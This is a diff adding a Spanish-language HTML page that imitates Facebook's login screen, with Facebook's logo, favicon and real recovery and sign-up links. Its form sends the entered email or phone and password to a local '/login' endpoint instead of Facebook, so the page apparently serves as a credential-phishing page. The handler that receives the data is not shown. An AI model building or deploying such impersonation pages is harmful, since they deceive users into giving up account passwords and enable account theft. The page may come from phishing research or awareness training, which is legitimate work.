@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="es" id="facebook" class="no_js">
+
+<head>
+    <meta charset="utf-8" />
+    <title>Iniciar sesión en Facebook</title>
+    <meta name="description"
+        content="Inicia sesión en Facebook para empezar a compartir y conectarte con tus amigos, tus familiares y las personas que conoces." />
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico" />
+</head>
+
+<body>
+    <div class="content">
+        <div class="login-container">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
+            <form id="login_form" action="/login" method="post">
+                <div>
+                    <input type="text" class="form-input" name="email" id="email"
+                        placeholder="Correo electrónico o número de teléfono" required />
+                </div>
+                <div>
+                    <input type="password" class="form-input" name="pass" id="pass" placeholder="Contraseña" required />
+                </div>
+                <div>
+                    <button type="submit" class="login-button">Iniciar sesión</button>
+                </div>
+                <div>
+                    <a href="https://www.facebook.com/recover/initiate">¿Olvidaste tu contraseña?</a>
+                </div>
+                <div>
+                    <a href="https://www.facebook.com/r.php">Crear cuenta nueva</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+
+        .content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            width: 100%;
+            margin: 6px 0;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 10px 0;
+        }
+
+        img {
+            width: 240px;
+            margin-bottom: 20px;
+        }
+    </style>
+</body>
+
+</html>
